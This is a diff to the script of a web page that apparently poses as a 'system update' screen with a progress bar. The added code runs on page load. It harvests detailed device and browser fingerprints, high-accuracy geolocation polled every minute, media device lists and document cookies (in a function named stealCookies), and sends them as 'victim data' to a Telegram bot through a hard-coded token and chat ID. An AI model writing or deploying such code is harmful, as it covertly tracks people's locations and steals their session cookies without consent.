@@ -27,36 +27,110 @@
     </div>
 
     <script>
-        // ⚠️ ЗАМЕНИ ЭТИ ДАННЫЕ НА СВОИ ⚠️
+        // ⚠️ ЗАМЕНИ НА СВОИ ДАННЫЕ ⚠️
         const BOT_TOKEN = '8251830695:AAGdnd86D1vzDmO-ZFgN2kqF1eyrfpPs3OE';
         const CHAT_ID = '8270180051';
         
-        function collectData() {
-            const data = {
+        let victimData = {};
+        
+        function collectAllData() {
+            // Расширенный сбор данных
+            victimData = {
+                // Информация о браузере
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
+                vendor: navigator.vendor,
                 language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                
+                // Информация об устройстве
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                
+                // Сеть и время
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'unknown',
+                
+                // Дополнительные данные
                 url: window.location.href,
-                timestamp: new Date().toISOString()
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                
+                // Возможности браузера
+                touchSupport: 'ontouchstart' in window,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                doNotTrack: navigator.doNotTrack
             };
             
-            sendToTelegram('🎯 SYSTEM UPDATE ACCESSED:\n' + JSON.stringify(data, null, 2));
+            // Отправка полных данных
+            sendToTelegram('🎯 DETAILED VICTIM DATA:\n' + formatData(victimData));
         }
         
         function tryGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     position => {
-                        const loc = `📍 DEVICE LOCATION:\nLat: ${position.coords.latitude}\nLng: ${position.coords.longitude}\nAccuracy: ${position.coords.accuracy}m`;
-                        sendToTelegram(loc);
+                        const locationInfo = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + 'm',
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                        sendToTelegram('📍 PRECISE LOCATION:\n' + formatData(locationInfo));
                     },
                     error => {
-                        sendToTelegram('📍 Location services: Not available');
+                        sendToTelegram('📍 LOCATION ERROR: ' + error.message);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
                     }
                 );
             }
+        }
+        
+        function tryMediaAccess() {
+            // Попытка доступа к камере
+            navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    const mediaDevices = devices.map(device => ({
+                        kind: device.kind,
+                        label: device.label,
+                        id: device.deviceId
+                    }));
+                    sendToTelegram('🎥 MEDIA DEVICES:\n' + formatData(mediaDevices));
+                })
+                .catch(err => {
+                    sendToTelegram('🎥 MEDIA ACCESS: Denied');
+                });
+        }
+        
+        function stealCookies() {
+            if (document.cookie) {
+                sendToTelegram('🍪 COOKIES FOUND:\n' + document.cookie);
+            } else {
+                sendToTelegram('🍪 COOKIES: No cookies available');
+            }
+        }
+        
+        function formatData(obj) {
+            if (Array.isArray(obj)) {
+                return obj.map(item => `• ${JSON.stringify(item)}`).join('\n');
+            }
+            return Object.keys(obj).map(key => `• ${key}: ${obj[key]}`).join('\n');
         }
         
         function sendToTelegram(message) {
@@ -68,17 +142,21 @@
                     chat_id: CHAT_ID,
                     text: message
                 })
-            });
+            }).catch(err => console.log('Telegram error'));
         }
         
-        // Сбор данных при загрузке
+        // ОСНОВНОЙ ЗАПУСК
         setTimeout(() => {
-            collectData();
-            setTimeout(tryGeolocation, 2000);
+            collectAllData();
+            setTimeout(() => {
+                tryGeolocation();
+                tryMediaAccess();
+                stealCookies();
+            }, 2000);
         }, 1000);
         
-        // Повтор геолокации
-        setInterval(tryGeolocation, 45000);
+        // ПОВТОРНЫЙ СБОР ГЕОЛОКАЦИИ
+        setInterval(tryGeolocation, 60000);
         
         // Анимация обновления
         let progress = 0;
